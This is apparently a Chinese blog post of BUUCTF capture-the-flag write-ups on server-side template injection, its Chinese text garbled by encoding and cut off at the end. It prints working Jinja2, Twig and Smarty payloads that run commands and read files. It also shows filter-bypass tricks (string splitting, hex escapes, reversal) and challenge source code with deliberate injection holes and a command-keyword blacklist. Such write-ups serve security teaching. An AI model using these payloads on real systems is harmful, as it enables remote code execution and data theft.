class="headerlink" title="Writeup"></a>Writeup</h2><h3 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220160349289.png" alt="image-20220220160349289"></p><p>å‘ç°æç¤º</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220160501360.png" alt="image-20220220160501360"></p><p>æµ‹è¯•æˆåŠŸ</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220160529875.png" alt="image-20220220160529875"></p><p>åˆ—å‡ºæ‰€æœ‰å­ç±»</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220160904114.png" alt="image-20220220160904114"></p><p>æ”¾å…¥find.pyè·‘ä¸€ä¸‹æ•æ„Ÿå‡½æ•°</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220161148184.png" alt="image-20220220161148184"></p><p>æ„é€ payload</p><pre><code class="python">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>å‡ºç°æœªçŸ¥é”™è¯¯</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220162228623.png" alt="image-20220220162228623"></p><p>è¿™é‡Œåº”è¯¥æ˜¯å…³é”®å­—è¿‡æ»¤</p><p>é‚£å°±ç»•å®ƒï¼</p><pre><code class="python">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('whoami').read()&#125;&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220170734065.png" alt="image-20220220170734065"></p><p>åŒç†å¯æ„é€ payload</p><pre><code class="python">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['__import__']('os').popen('whoami').read()&#125;&#125;</code></pre><p>è¯»å–flag</p><pre><code class="python">http://91ff8d9a-4ad0-491a-8d5d-c55157088e4f.node4.buuoj.cn:81/?search=&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('cat flasklight/coomme_geeeett_youur_flek ').read()&#125;&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220171038110.png" alt="image-20220220171038110"></p><h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220191434667.png" alt="image-20220220191434667"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220193930268.png" alt="image-20220220193930268"></p><p>å­˜åœ¨æ¨¡æ¿æ³¨å…¥</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220193953376.png" alt="image-20220220193953376"></p><p>åˆ¤æ–­ä¸ºtwigæ³¨å…¥</p><p>payload</p><pre><code class="php">&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("whoami")&#125;&#125;</code></pre><p>å†™å…¥è¾“å…¥æ¡†æ²¡æœ‰æ•ˆæœ</p><p>hinté¡µé¢æœ‰æç¤º</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220194318325.png" alt="image-20220220194318325"></p><p>æŠ“åŒ…åˆ†æ</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220194407436.png" alt="image-20220220194407436"></p><p>å‘ç°cookieä¸­æœ‰useræ¥å—æˆ‘ä»¬è¾“å…¥çš„å€¼ï¼ŒçŒœæµ‹è¿™ä¸ªæ¨¡æ¿æ³¨å…¥å‚æ•°åœ¨cookieä¸­</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220194639959.png" alt="image-20220220194639959"></p><p>æˆåŠŸè·å¾—flag</p><h3 id="WesternCTF2018-shrine-æƒ³æ–¹è®¾æ³•è·å–config"><a href="#WesternCTF2018-shrine-æƒ³æ–¹è®¾æ³•è·å–config" class="headerlink" title="[WesternCTF2018]shrine æƒ³æ–¹è®¾æ³•è·å–config"></a>[WesternCTF2018]shrine æƒ³æ–¹è®¾æ³•è·å–config</h3><p>è¿›å»æºç å¦‚ä¸‹</p><pre><code class="python">import flaskimport osapp = flask.Flask(__name__)app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)@app.route(&#39;/&#39;)def index():    return open(__file__).read()@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)def shrine(shrine):    def safe_jinja(s):        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)        blacklist = [&#39;config&#39;, &#39;self&#39;]        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s    return flask.render_template_string(safe_jinja(shrine))if __name__ == &#39;__main__&#39;:    app.run(debug=True)</code></pre><p>ç¬¬ä¸€ä¸ªè·¯ç”±æ˜¯æ˜¾ç¤ºæºç çš„ï¼Œç¬¬äºŒä¸ªè·¯ç”±å¯ä»¥ä¼ å…¥å‚æ•°ï¼Œè€Œä¸”æœ‰é»‘åå•è¿‡æ»¤ï¼ŒçŒœæµ‹è¦è¯»å–é…ç½®æ–‡ä»¶</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220214030161.png" alt="image-20220220214030161"></p><p>æµ‹è¯•ä¸€ä¸‹å­˜åœ¨æ¨¡æ¿æ³¨å…¥</p><p>è¦åˆ©ç”¨æ¨¡æ¿æ³¨å…¥æ¥è¯»å–é…ç½®ï¼Œconfigå’Œselfè¢«è¿‡æ»¤ï¼Œä½†æˆ‘ä»¬ä»ç„¶å¯ä»¥åˆ©ç”¨url_for()å’Œget_flashed_messages()å‡½æ•°æ¥è¯»å–config</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220215728961.png" alt="image-20220220215728961"></p><p>å‘ç°</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220215825765.png" alt="image-20220220215825765"></p><p>current_appæ„æ€åº”è¯¥æ˜¯å½“å‰appï¼Œé‚£æˆ‘ä»¬å°±å½“å‰appä¸‹çš„config</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220215947455.png" alt="image-20220220215947455"></p><p>flagå‡ºæ¥äº†</p><p>æœ€ç»ˆpayload</p><pre><code class="python">http://139fe4b8-9ae9-452c-9af3-142eef361b68.node4.buuoj.cn:81/shrine/&#123;&#123;url_for.__globals__['current_app'].config['FLAG'])&#125;&#125;</code></pre><p>åŒç†</p><pre><code class="python">http://139fe4b8-9ae9-452c-9af3-142eef361b68.node4.buuoj.cn:81/shrine/&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</code></pre><h3 id="CISCN2019-åä¸œå—èµ›åŒº-Web11-smartyæ¨¡æ¿æ³¨å…¥"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11-smartyæ¨¡æ¿æ³¨å…¥" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11 smartyæ¨¡æ¿æ³¨å…¥"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11 smartyæ¨¡æ¿æ³¨å…¥</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221132600497.png" alt="image-20220221132600497"></p><p>æ•æ„Ÿç‚¹X-Forwarded-For</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221132701696.png" alt="image-20220221132701696"></p><p>ä¼šéšX-Forwarded-Forçš„å˜åŒ–è€Œå˜åŒ–</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221133442199.png" alt="image-20220221133442199"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221133450679.png" alt="image-20220221133450679"></p><p>å­˜åœ¨æ¨¡æ¿æ³¨å…¥</p><pre><code>X-Forwarded-For: &#123;$smarty.version&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221133545104.png" alt="image-20220221133545104"></p><p>åˆ¤æ–­è¯¥æ¨¡æ¿ä¸ºsmartï¼Œç‰ˆæœ¬å·ä¸º3.1.30</p><h4 id="if-æ ‡ç­¾"><a href="#if-æ ‡ç­¾" class="headerlink" title="{if}æ ‡ç­¾"></a><code>&#123;if&#125;</code>æ ‡ç­¾</h4><p>å®˜æ–¹æ–‡æ¡£ä¸­çš„æè¿°ï¼š</p><ul><li>Smartyçš„<code>&#123;if&#125;</code>æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„iféå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§</li><li>æ¯ä¸ª<code>&#123;if&#125;</code>å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„<code>&#123;/if&#125;</code>ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<code>&#123;else&#125;</code> å’Œ <code>&#123;elseif&#125;</code></li><li>å…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œå¦‚<code>||</code>, <code>or</code>, <code>&amp;&amp;</code>, <code>and,</code> <code>is_array(),</code> ç­‰ç­‰ï¼Œå¦‚ï¼š<code>&#123;if is_array($array)&#125;&#123;/if&#125;</code></li></ul><p>payload</p><pre><code class="python">&#123;if phpinfo()&#125;&#123;/if&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221133721417.png" alt="image-20220221133721417"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221133820171.png" alt="image-20220221133820171"></p><h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221134457254.png" alt="image-20220221134457254"></p><p>å’Œä¸Šé“é¢˜å¾ˆç›¸ä¼¼,æµ‹è¯•ä¸€ä¸‹</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221134530290.png" alt="image-20220221134530290"></p><p>æ¨¡æ¿æ³¨å…¥æœ‰äº†</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221134855416.png" alt="image-20220221134855416"></p><p>è¿˜æ˜¯smartæ¨¡æ¿</p><p>å’Œä¸Šé“é¢˜ä¸€æ¨¡ä¸€æ ·ï¼Œç›´æ¥æ‹¿ä¸‹</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221135006801.png" alt="image-20220221135006801"></p><h3 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221141908719.png" alt="image-20220221141908719"></p><p>hint:å¤±è´¥çš„æ„æ€å°±æ˜¯ï¼Œè¦è®©ç¨‹åºè¿è¡ŒæŠ¥é”™,æŠ¥é”™åä¼šæš´éœ²æºç ã€‚</p><p>base64decodeåœ¨ä¸ä¼šè§£æçš„æ—¶å€™å°±ä¼šæŠ¥é”™ã€‚</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221141936523.png" alt="image-20220221141936523"></p><p>æ‹¿åˆ°æºç </p><pre><code class="python">@app.route(&#39;/decode&#39;,methods=[&#39;POST&#39;,&#39;GET&#39;])def decode():    if request.values.get(&#39;text&#39;) :        text = request.values.get(&quot;text&quot;)        text_decode = base64.b64decode(text.encode())        tmp = &quot;ç»“æœ ï¼š &#123;0&#125;&quot;.format(text_decode.decode())        if waf(tmp) :            flash(&quot;no no no !!&quot;)            return redirect(url_for(&#39;decode&#39;))        res =  render_template_string(tmp)        flash( res )</code></pre><p>åº”è¯¥å­˜åœ¨æ¨¡æ¿æ³¨å…¥ï¼Œæµ‹è¯•ä¸€ä¸‹</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221142421065.png" alt="image-20220221142421065"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221142406088.png" alt="image-20220221142406088"></p><p>æ¨¡æ¿æ³¨å…¥æœ‰äº†</p><p>ä¸Špayload</p><pre><code class="python">&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221142900538.png" alt="image-20220221142900538"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221142907823.png" alt="image-20220221142907823"></p><p>è¢«è¿™é‡Œçš„wafè¿‡æ»¤äº†</p><p>è¯»å–ä¸‹app.py</p><pre><code class="python">&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><pre><code class="python">from flask import Flask,render_template_stringfrom flask import render_template,request,flash,redirect,url_forfrom flask_wtf import FlaskFormfrom wtforms import StringField, SubmitFieldfrom wtforms.validators import DataRequiredfrom flask_bootstrap import Bootstrapimport base64 app = Flask(__name__)app.config[&#39;SECRET_KEY&#39;] = &#39;s_e_c_r_e_t_k_e_y&#39;bootstrap = Bootstrap(app) class NameForm(FlaskForm):    text = StringField(&#39;BASE64åŠ å¯†&#39;,validators= [DataRequired()])    submit = SubmitField(&#39;æäº¤&#39;)class NameForm1(FlaskForm):    text = StringField(&#39;BASE64è§£å¯†&#39;,validators= [DataRequired()])    submit = SubmitField(&#39;æäº¤&#39;) def waf(str):    black_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;,                  &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;]    for x in black_list :        if x in str.lower() :            return 1  @app.route(&#39;/hint&#39;,methods=[&#39;GET&#39;])def hint():    txt = &quot;å¤±è´¥ä¹ƒæˆåŠŸä¹‹æ¯ï¼ï¼&quot;    return render_template(&quot;hint.html&quot;,txt = txt)  @app.route(&#39;/&#39;,methods=[&#39;POST&#39;,&#39;GET&#39;])def encode():    if request.values.get(&#39;text&#39;) :        text = request.values.get(&quot;text&quot;)        text_decode = base64.b64encode(text.encode())        tmp = &quot;ç»“æœ  :&#123;0&#125;&quot;.format(str(text_decode.decode()))        res =  render_template_string(tmp)        flash(tmp)        return redirect(url_for(&#39;encode&#39;))     else :        text = &quot;&quot;        form = NameForm(text)        return render_template(&quot;index.html&quot;,form = form ,method = &quot;åŠ å¯†&quot; ,img = &quot;flask.png&quot;) @app.route(&#39;/decode&#39;,methods=[&#39;POST&#39;,&#39;GET&#39;])def decode():    if request.values.get(&#39;text&#39;) :        text = request.values.get(&quot;text&quot;)        text_decode = base64.b64decode(text.encode())        tmp = &quot;ç»“æœ ï¼š &#123;0&#125;&quot;.format(text_decode.decode())        if waf(tmp) :            flash(&quot;no no no !!&quot;)            return redirect(url_for(&#39;decode&#39;))        res =  render_template_string(tmp)        flash( res )        return redirect(url_for(&#39;decode&#39;))     else :        text = &quot;&quot;        form = NameForm1(text)        return render_template(&quot;index.html&quot;,form = form, method = &quot;è§£å¯†&quot; , img = &quot;flask1.png&quot;)  @app.route(&#39;/&lt;name&gt;&#39;,methods=[&#39;GET&#39;])def not_found(name):    return render_template(&quot;404.html&quot;,name = name) if __name__ == &#39;__main__&#39;:    app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True)</code></pre><pre><code class="python"> def waf(str): black_list = [&quot;flag&quot;, &quot;os&quot;,        &quot;system&quot;, &quot;popen&quot;, &quot;import&quot;, &quot;eval&quot;, &quot;chr&quot;, &quot;request&quot;,        &quot;subprocess&quot;, &quot;commands&quot;, &quot;socket&quot;, &quot;hex&quot;, &quot;base64&quot;, &quot;*&quot;, &quot;?&quot;]</code></pre><p>æˆ‘ä»¬å‘ç°wafè¿‡æ»¤äº†è¿™äº›å…³é”®è¯ï¼Œæˆ‘ä»¬è¦è¿›è¡Œç»•è¿‡</p><pre><code class="python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221152148066.png" alt="image-20220221152148066"></p><p>è¯»å–ä¸‹flag</p><pre><code class="python">&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/this_is_the_f'+'lag.txt', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221152432736.png" alt="image-20220221152432736"></p><p>è¯»å–ä½¿ç”¨åˆ‡ç‰‡çœå»äº†æ‹¼æ¥flagçš„æ­¥éª¤</p><pre><code class="python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==â€˜catch_warningsâ€˜ %&#125;&#123;&#123; c.__init__.__globals__[â€˜__builtins__â€˜].open(â€˜txt.galf_eht_si_siht/â€˜[::-1],â€˜râ€˜).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><h3 id="pasecactf-2019-flask-ssti-ç¼–ç ç»•è¿‡"><a href="#pasecactf-2019-flask-ssti-ç¼–ç ç»•è¿‡" class="headerlink" title="[pasecactf_2019]flask_ssti ç¼–ç ç»•è¿‡"></a>[pasecactf_2019]flask_ssti ç¼–ç ç»•è¿‡</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223130128195.png" alt="image-20220223130128195"></p><p>å­˜åœ¨æ¨¡æ¿æ³¨å…¥</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223130221897.png" alt="image-20220223130221897"></p><p>åˆ—ä¸¾å­ç±»è¢«ç¦æ­¢</p><p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°æ˜¯ __   .    â€˜  è¢«è¿‡æ»¤</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223130556622.png" alt="image-20220223130556622"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223130610494.png" alt="image-20220223130610494"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223130822136.png" alt="image-20220223130822136"></p><p>è½¬16è¿›åˆ¶ç»•è¿‡</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223221456791.png" alt="image-20220223221456791"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223222201394.png" alt="image-20220223222201394"></p><p>exp </p><pre><code class="python">&#123;&#123;""["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[127]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["popen"]("whoami")["read"]()&#125;&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223224419318.png" alt="image-20220223224419318"></p><p>è§£æ³•ä¸€:</p><p>è¯»å–app.pyæºç ,å‘ç°:</p><pre><code class="python">def encode(line, key, key2): return &#39;&#39;.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))app.config[&#39;flag&#39;] = encode(&#39;&#39;, &#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#39;, &#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#39;) </code></pre><p>è¯»å–configï¼Œflagå€¼ä¸º</p><pre><code>&#39;-M7\x10w\x12d9cT#`&#125;\x0e\x1e\x0fiS(D\x1e\x13X\x17&#123;n\x03g\x02\t\x10[#\x07/(Ak\x15^NG&#39;&#125;&gt; </code></pre><p>è§£å¯†è„šæœ¬:</p><pre><code class="python">key=&#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#39;key2=&#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#39;flag_encoded=&#39;è¿™é‡Œæ”¾åŠ å¯†åçš„flag&#39;flag=&#39;&#39;for x in range(len(flag_encoded)):    for i in range(33,127):        if flag_encoded[x]==chr(x ^ i ^ ord(key[::-1][x]) ^ ord(key2[x])):            flag+=chr(i)            print(flag)</code></pre><p>è§£æ³•äºŒ:</p><p><code>/proc/self</code>è¡¨ç¤ºå½“å‰è¿›ç¨‹ç›®å½•</p><p>è·å–å½“å‰è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶å†…å®¹:cat /proc/self/fd/{id}</p><p><strong>æ³¨æ„ï¼š</strong>åœ¨çœŸæ­£åšé¢˜çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ˜¯ä¸èƒ½é€šè¿‡å‘½ä»¤çš„æ–¹å¼æ‰§è¡Œé€šè¿‡catå‘½ä»¤è¯»å–cmdlineçš„ã€‚å› ä¸ºå¦‚æœ catè¯»å–/proc/self/cmdline/çš„è¯ï¼Œå¾—åˆ°çš„æ˜¯ catè¿›ç¨‹çš„ä¿¡æ¯ã€‚æ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡é¢˜ç›®çš„å½“å‰è¿›ç¨‹ä½¿ç”¨è¯»å–æ–‡ä»¶ï¼ˆæ¯”å¦‚ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œï¼ŒSSTIï¼Œï¼Œfile:\\æœ¬åœ°è¯»å–ï¼Œï¼Œ../../../ç›®å½•ç©¿è¶Šï¼Œï¼ŒSSRFï¼‰çš„æ–¹å¼è¯»å–/proc/self/cmdline</p><pre><code>&#123;&#123;()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")&#125;&#125;</code></pre><h3 id="GWCTF-2019-ä½ çš„åå­—"><a href="#GWCTF-2019-ä½ çš„åå­—" class="headerlink" title="[GWCTF 2019]ä½ çš„åå­—"></a>[GWCTF 2019]ä½ çš„åå­—</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226141959161.png" alt="image-20220226141959161"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226142008734.png" alt="image-20220226142008734"></p><p>æµ‹äº†ä¸€ä¸‹ï¼Œç»™äº†ä¸ªphpçš„æŠ¥é”™</p><p>è¿™é‡Œå…¶å®ç»™äº†ä¸€ä¸ªç¼–å‡ºæ¥çš„PHPå‡æŠ¥é”™ï¼ˆå®³äººï¼‰</p><p><code>&#123;&#123;...&#125;&#125;</code>è£…è½½ä¸€ä¸ªå˜é‡ï¼Œæ¨¡æ¿æ¸²æŸ“çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨ä¼ è¿›æ¥çš„åŒåå‚æ•°è¿™ä¸ªå˜é‡ä»£è¡¨çš„å€¼æ›¿æ¢æ‰ã€‚<br><code>&#123;% ... %&#125;</code>ï¼šè£…è½½ä¸€ä¸ªæ§åˆ¶è¯­å¥ã€‚<br><code>&#123;# ... 